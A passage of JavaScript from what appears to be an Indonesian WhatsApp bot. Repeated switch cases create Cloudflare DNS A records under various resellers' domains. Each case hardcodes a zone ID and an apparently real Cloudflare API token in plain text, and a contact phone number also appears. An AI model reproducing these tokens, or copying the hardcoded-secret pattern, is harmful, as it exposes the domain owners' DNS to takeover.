                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 

case 'domain25': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a6c9cf9cd38077e52db6874200c5c0c4";
               let apitoken = "DyQW84WhtZwTfWZCanO-MQNd6gglRwDHOmK8KRF2";
               let tld = "panellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
   case 'domain26': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "512f917ecb9e0d4eb0085458fdcc95ee";
               let apitoken = "a4hizwK6UjIi8MBEscAOVNG-njTDfJejAhOJlOFh";
               let tld = "panellku.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
    case 'domain27': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b268933cdea4ffd662bc56dd84e46e21";
               let apitoken = "v80Y6QMWDamHAg-u18z8IEMBp1kpodn_lZkyduJ8";
               let tld = "panellku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain28': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4e1c19a2687fe1a2505fecaf3de3e7ff";
               let apitoken = "p4oS8J-Tc0Rt9z4tgS3gdzbaG-aL0FQ0Ro1mpl-Q";
               let tld = "panellku.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break        
         case 'domain29': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "72fc614619292a5d6c86d3e736b14062";
               let apitoken = "MF2cgyOmXeFdrwpcTS4XRbYbDL9zsmF6XY6TIFlv";
               let tld = "panelkuu.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain30': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c8a876bc10af3ce5ab11f2209121cf63";
               let apitoken = "O8uR00EP6u4Rp9TtmwCSASwfkEHAIaNw2DVmIgAD";
               let tld = "panellku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain31': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ecfab91669cd9f1f269ff910ef37c4bc";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain32': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6e54db622bb8682bdf42316953b5401d";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
	case 'domain33': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "601cbd78e8141e5ffa37e5bcac5f1e00";
               let apitoken = "TXXi3Cz2NusjfQ4_KStk-mc-IaIKzCj_sINwPLm";
               let tld = "rulzxyxd.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain34': case 'domain35': {
     if (!jangan) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
     }
     break
          case 'domain36': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "44379cef53cb4d8b5e28c11d28efff19";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "rizalshop.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain37': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain38': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Dev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
            break
          case 'domain39': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0aec98100985db6fa9390b8983c1e9b8";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "home-panel.pw";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain40': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864 id")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80eccb8365dd03f4cd3408ed221f0a30";
               let apitoken = "UiM1CzcdcAYE_0wK1cv6nknLhR83lLywzzGQ5Q3r";
               let tld = "aswinxd.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain41': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "433a5c33932fa9ae50165c9df5e15f0e";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "panel-zall.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain42': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
